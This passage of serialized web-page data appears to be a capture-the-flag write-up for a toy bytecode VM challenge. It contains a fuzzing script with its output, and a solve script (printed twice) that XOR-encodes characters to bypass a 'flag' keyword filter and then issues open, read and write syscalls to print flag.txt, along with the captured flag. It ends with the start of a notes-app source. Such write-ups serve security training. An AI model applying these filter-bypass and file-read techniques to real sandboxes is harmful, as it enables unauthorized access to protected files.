ip=0x3\nb'\\x07\\x99\\x00\\n' Unknown instruction at ip=0x3\nb'\\x07\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x07\\x04\\x99\\x00\\n' reg index out of range\nb'\\x07\\x99\\x06\\x00\\n' Thanks for playing\nb'\\x07\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 8:\nb'\\x08\\x00\\x00\\n' Thanks for playing\nb'\\x08\\x04\\x00\\n' Unknown instruction at ip=0x3\nb'\\x08\\x08\\x00\\n' Thanks for playing\nb'\\x08\\x99\\x00\\n' Unknown instruction at ip=0x1\nb'\\x08\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x08\\x04\\x99\\x00\\n' reg index out of range\nb'\\x08\\x99\\x06\\x00\\n' Unknown instruction at ip=0x1\nb'\\x08\\x99\\x99\\x00\\n' Unknown instruction at ip=0x1\n========\nInstruction 9:\nb'\\t\\x00\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x04\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x08\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x99\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x04\\x06\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x04\\x99\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x99\\x06\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x99\\x99\\x00\\n' Unknown instruction at ip=0x0\n========\n\"\"\"\n"])</script><script>self.__next_f.push([1,"18:T18e9,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e challengeio \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e send\n\n\u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003erange\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e10\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"Instruction \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e:\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e opt \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\\x00\\x00\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\\x04\\x00\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\\x08\\x00\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\\x99\\x00\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"token string\"\u003e\"\\x04\\x06\\x00\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\\x04\\x99\\x00\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\\x99\\x06\\x00\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\\x99\\x99\\x00\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ebytes\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e opt\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"latin1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e send\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"========\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"token triple-quoted-string string\"\u003e\"\"\"\nInstruction 0:\nb'\\x00\\x00\\x00\\n' Thanks for playing\nb'\\x00\\x04\\x00\\n' Thanks for playing\nb'\\x00\\x08\\x00\\n' Thanks for playing\nb'\\x00\\x99\\x00\\n' Thanks for playing\nb'\\x00\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x00\\x04\\x99\\x00\\n' Thanks for playing\nb'\\x00\\x99\\x06\\x00\\n' Thanks for playing\nb'\\x00\\x99\\x99\\x00\\n' Thanks for playing\n========\nInstruction 1:\nb'\\x01\\x00\\x00\\n' Thanks for playing\nb'\\x01\\x04\\x00\\n' Thanks for playing\nb'\\x01\\x08\\x00\\n' Thanks for playing\nb'\\x01\\x99\\x00\\n' Thanks for playing\nb'\\x01\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x01\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x01\\x99\\x06\\x00\\n' Thanks for playing\nb'\\x01\\x99\\x99\\x00\\n' Unknown instruction at ip=0x2\n========\nInstruction 2:\nb'\\x02\\x00\\x00\\n' Thanks for playing\nb'\\x02\\x04\\x00\\n' Thanks for playing\nb'\\x02\\x08\\x00\\n' reg index out of range\nb'\\x02\\x99\\x00\\n' reg index out of range\nb'\\x02\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x02\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x02\\x99\\x06\\x00\\n' reg index out of range\nb'\\x02\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 3:\nb'\\x03\\x00\\x00\\n' Thanks for playing\nb'\\x03\\x04\\x00\\n' Thanks for playing\nb'\\x03\\x08\\x00\\n' reg index out of range\nb'\\x03\\x99\\x00\\n' reg index out of range\nb'\\x03\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x03\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x03\\x99\\x06\\x00\\n' reg index out of range\nb'\\x03\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 4:\nb'\\x04\\x00\\x00\\n' Thanks for playing\nb'\\x04\\x04\\x00\\n' Thanks for playing\nb'\\x04\\x08\\x00\\n' reg index out of range\nb'\\x04\\x99\\x00\\n' reg index out of range\nb'\\x04\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x04\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x04\\x99\\x06\\x00\\n' reg index out of range\nb'\\x04\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 5:\nb'\\x05\\x00\\x00\\n' Thanks for playing\nb'\\x05\\x04\\x00\\n' Thanks for playing\nb'\\x05\\x08\\x00\\n' reg index out of range\nb'\\x05\\x99\\x00\\n' reg index out of range\nb'\\x05\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x05\\x04\\x99\\x00\\n' Unknown instruction at ip=0x2\nb'\\x05\\x99\\x06\\x00\\n' reg index out of range\nb'\\x05\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 6:\nb'\\x06\\x00\\x00\\n' Unknown instruction at ip=0x3\nb'\\x06\\x04\\x00\\n' Unknown instruction at ip=0x3\nb'\\x06\\x08\\x00\\n' reg index out of range\nb'\\x06\\x99\\x00\\n' reg index out of range\nb'\\x06\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x06\\x04\\x99\\x00\\n' Thanks for playing\nb'\\x06\\x99\\x06\\x00\\n' reg index out of range\nb'\\x06\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 7:\nb'\\x07\\x00\\x00\\n' Unknown instruction at ip=0x3\nb'\\x07\\x04\\x00\\n' Unknown instruction at ip=0x3\nb'\\x07\\x08\\x00\\n' Unknown instruction at ip=0x3\nb'\\x07\\x99\\x00\\n' Unknown instruction at ip=0x3\nb'\\x07\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x07\\x04\\x99\\x00\\n' reg index out of range\nb'\\x07\\x99\\x06\\x00\\n' Thanks for playing\nb'\\x07\\x99\\x99\\x00\\n' reg index out of range\n========\nInstruction 8:\nb'\\x08\\x00\\x00\\n' Thanks for playing\nb'\\x08\\x04\\x00\\n' Unknown instruction at ip=0x3\nb'\\x08\\x08\\x00\\n' Thanks for playing\nb'\\x08\\x99\\x00\\n' Unknown instruction at ip=0x1\nb'\\x08\\x04\\x06\\x00\\n' Thanks for playing\nb'\\x08\\x04\\x99\\x00\\n' reg index out of range\nb'\\x08\\x99\\x06\\x00\\n' Unknown instruction at ip=0x1\nb'\\x08\\x99\\x99\\x00\\n' Unknown instruction at ip=0x1\n========\nInstruction 9:\nb'\\t\\x00\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x04\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x08\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x99\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x04\\x06\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x04\\x99\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x99\\x06\\x00\\n' Unknown instruction at ip=0x0\nb'\\t\\x99\\x99\\x00\\n' Unknown instruction at ip=0x0\n========\n\"\"\"\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"19:T941,"])</script><script>self.__next_f.push([1,"from challengeio import send\n\n\ndef store(s):\n    payload = b\"\"\n    for offset, ch in enumerate(s):\n        offset = bytes([offset])\n        # 'f','l','a','g' is forbidden\n        if ch in \"flag\":\n            ch_xor_0xff = bytes([ord(ch) ^ 0xFF])\n            payload += b\"\\x01\" + ch_xor_0xff  # push(ch ^ 0xFF)\n            payload += b\"\\x02\\x00\"  # pop(R0)\n            payload += b\"\\x01\\xff\"  # push(0xFF)\n            payload += b\"\\x02\\x07\"  # pop(R7)\n            payload += b\"\\x05\\x07\"  # R0 ^= R7\n            payload += b\"\\x07\" + offset + b\"\\x00\"  # store(offset, R0)\n        else:\n            ch = bytes([ord(ch)])\n            payload += b\"\\x01\" + ch  # push(ch)\n            payload += b\"\\x02\\x07\"  # pop(R7)\n            payload += b\"\\x07\" + offset + b\"\\x07\"  # store(offset, R7)\n    return payload\n\n\ndef open():\n    payload = b\"\\x01\\x02\"  # push(2) -\u003e R0, syscall_number = 2 (open)\n    payload += b\"\\x01\\x00\"  # push(0) -\u003e R1, path_addr = 0x00 (flag.txt)\n    payload += b\"\\x01\\x00\"  # push(0) -\u003e R2, flags = 0 (read-only)\n    payload += b\"\\x02\\x02\\x02\\x01\\x02\\x00\"  # pop(R2), pop(R1), pop(R0)\n    payload += b\"\\x08\"  # syscall\n    payload += b\"\\x03\\x00\\x02\\x06\"  # push(R0), pop(R6) -\u003e R6 = fd\n    payload += b\"\\x08\"  # syscall\n    return payload\n\n\ndef read(size):\n    size = bytes([size])\n    payload = b\"\\x01\\x00\"  # push(0) -\u003e R0, syscall_number = 0 (read)\n    payload += b\"\\x03\\x06\"  # push(R6) -\u003e R1, fd = R6 (result of open syscall)\n    payload += b\"\\x01\\x00\"  # push(0) -\u003e R2, start_addr = 0x00\n    payload += b\"\\x01\" + size  # push(size) -\u003e R3\n    payload += b\"\\x02\\x03\\x02\\x02\\x02\\x01\\x02\\x00\"  # pop(R3), pop(R2), pop(R1), pop(R0)\n    payload += b\"\\x08\"  # syscall\n    return payload\n\n\ndef output(size):\n    size = bytes([size])\n    payload = b\"\\x01\\x01\"  # push(1) -\u003e R0, syscall_number = 1 (write)\n    payload += b\"\\x01\\x01\"  # push(1) -\u003e R1, fd = 1 (stdout)\n    payload += b\"\\x01\\x00\"  # push(0) -\u003e R2, start_addr = 0x00\n    payload += b\"\\x01\" + size  # push(size) -\u003e R3\n    payload += b\"\\x02\\x03\\x02\\x02\\x02\\x01\\x02\\x00\"  # pop(R3), pop(R2), pop(R1), pop(R0)\n    payload += b\"\\x08\"  # syscall\n    return payload\n\n\nsize = 45\npayload = store(\"flag.txt\") + open() + read(size) + output(size) + b\"\\x00\"\nprint(payload)\nprint(send(payload))  # idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}Thanks for playing\n\n# idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}\n"])</script><script>self.__next_f.push([1,"1a:T25d0,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e challengeio \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e send\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003estore\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003es\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\"\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e offset\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e ch \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eenumerate\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003es\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        offset \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ebytes\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e# 'f','l','a','g' is forbidden\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e ch \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"flag\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            ch_xor_0xff \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ebytes\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token builtin\"\u003eord\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e^\u003c/span\u003e \u003cspan class=\"token number\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e ch_xor_0xff  \u003cspan class=\"token comment\"\u003e# push(ch ^ 0xFF)\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x02\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# pop(R0)\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\xff\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(0xFF)\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x02\\x07\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# pop(R7)\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x05\\x07\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# R0 ^= R7\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x07\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e offset \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# store(offset, R0)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            ch \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ebytes\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token builtin\"\u003eord\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e ch  \u003cspan class=\"token comment\"\u003e# push(ch)\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x02\\x07\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# pop(R7)\u003c/span\u003e\n            payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x07\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e offset \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x07\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# store(offset, R7)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e payload\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eopen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\x02\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(2) -\u003e R0, syscall_number = 2 (open)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(0) -\u003e R1, path_addr = 0x00 (flag.txt)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(0) -\u003e R2, flags = 0 (read-only)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x02\\x02\\x02\\x01\\x02\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# pop(R2), pop(R1), pop(R0)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x08\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# syscall\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x03\\x00\\x02\\x06\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(R0), pop(R6) -\u003e R6 = fd\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x08\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# syscall\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e payload\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eread\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esize\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    size \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ebytes\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003esize\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(0) -\u003e R0, syscall_number = 0 (read)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x03\\x06\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(R6) -\u003e R1, fd = R6 (result of open syscall)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(0) -\u003e R2, start_addr = 0x00\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e size  \u003cspan class=\"token comment\"\u003e# push(size) -\u003e R3\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x02\\x03\\x02\\x02\\x02\\x01\\x02\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# pop(R3), pop(R2), pop(R1), pop(R0)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x08\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# syscall\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e payload\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eoutput\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esize\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    size \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ebytes\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003esize\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\x01\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(1) -\u003e R0, syscall_number = 1 (write)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\x01\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(1) -\u003e R1, fd = 1 (stdout)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# push(0) -\u003e R2, start_addr = 0x00\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x01\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e size  \u003cspan class=\"token comment\"\u003e# push(size) -\u003e R3\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x02\\x03\\x02\\x02\\x02\\x01\\x02\\x00\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# pop(R3), pop(R2), pop(R1), pop(R0)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x08\"\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# syscall\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e payload\n\n\nsize \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e45\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e store\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"flag.txt\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eopen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e read\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esize\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e output\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esize\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"\\x00\"\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esend\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}Thanks for playing\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e# idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1b:T62b,const express = require(\"express\");\nconst path = require(\"path\");\nconst crypto = require(\"crypto\");\nconst cookieParser = require(\"cookie-parser\");\nconst app = express();\n\napp.use(express.json());\napp.set(\"view engine\", \"ejs\");\napp.set(\"views\", path.join(__dirname, \"views\"));\napp.use(express.static(\"public\"));\napp.use(cookieParser());\n\nconst get_id = () =\u003e crypto.randomBytes(16).toString(\"hex\");\n\nconst notes = new Map;\n\n/* post a note */\napp.post(\"/api/post\", (req, res) =\u003e {\n    const {\n        noteTitle,\n        noteContent\n    } = req.body;\n    if (!noteTitle || typeof noteTitle !== \"string\" || !noteContent || typeof noteContent !== \"string\") {\n        return res.status(400).json({\n            message: \"invalid note\"\n        });\n    }\n    const id = get_id();\n    notes.set(id, {\n        noteTitle,\n        noteContent\n    });\n    return res.json({\n        id\n    });\n});\n\n/* retrieve a note */\napp.get(\"/api/view/:note\", (req, res) =\u003e {\n    return 